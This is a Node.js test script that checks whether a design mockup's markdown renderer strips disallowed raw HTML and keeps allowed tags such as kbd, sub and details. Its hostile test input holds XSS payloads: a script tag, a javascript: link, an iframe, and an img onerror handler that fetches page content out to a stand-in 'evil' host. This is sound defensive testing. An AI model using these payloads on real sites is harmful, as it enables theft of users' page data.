/* Checks that design/mockup.js honours the raw-HTML allow-list in IMPL.md §4.
 *
 * The mockup is the behaviour spec, so the allow-list has to hold there too — otherwise the
 * reference implementation quietly disagrees with the contract. Run it after touching the
 * renderer:
 *
 *     node design/check-raw-html.mjs
 *
 * It slices the real renderer out of mockup.js rather than importing it, because mockup.js
 * expects a DOM. Testing a copy would test the wrong thing.
 */
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const src = fs.readFileSync(path.join(here, "mockup.js"), "utf8");

const start = src.indexOf("const esc =");
const end = src.indexOf("/** Read-only syntax highlighting");
if (start < 0 || end < 0) throw new Error("renderer slice markers not found in mockup.js");

const { inline, renderMarkdown } = new Function(
  "const DIAGRAMS = {};\n" + src.slice(start, end) + "\nreturn { inline, renderMarkdown };"
)();

/* Every line is a way someone could get markup into a document. */
const hostile = `# Title

<script>alert(1)</script>

<img src=x onerror="fetch('http://evil/?d='+document.body.innerHTML)">

<a href="javascript:alert(1)">click me</a>

<div align="center">centered badge</div>

<iframe src="https://evil"></iframe>

Text with <kbd>Ctrl</kbd> and H<sub>2</sub>O inline.

<details>
<summary>More, please</summary>

Inside the fold.

</details>
`;

const { html } = renderMarkdown(hostile);

const mustNotAppear = ["<script", "onerror", "javascript:", "<img", "<div", "<iframe", "align="];
const mustAppear = ["<kbd>", "</kbd>", "<sub>", "</sub>", "<details>", "</details>", "<summary>"];

let failed = 0;
const check = (ok, label) => {
  if (!ok) failed++;
  console.log(`${ok ? "ok  " : "FAIL"}  ${label}`);
};

for (const s of mustNotAppear) check(!html.includes(s), `dropped: ${JSON.stringify(s)}`);
for (const s of mustAppear) check(html.includes(s), `kept:    ${JSON.stringify(s)}`);

/* Inline tags are removed without eating the text around them; block-level HTML goes whole. */
const inlineCases = [
  ["safe <kbd>Esc</kbd> tail", "safe <kbd>Esc</kbd> tail"],
  ["x <span>hi</span> z", "x hi z"],
  ["x <object data=y></object> z", "x  z"],
];
for (const [input, expected] of inlineCases) {
  const got = inline(input);
  check(got === expected, `inline(${JSON.stringify(input)}) === ${JSON.stringify(expected)}`);
}

if (failed) {
  console.error(`\n${failed} assertion(s) failed — see IMPL.md §4 for the policy.`);
  process.exit(1);
}
console.log("\nraw-HTML allow-list holds in mockup.js");
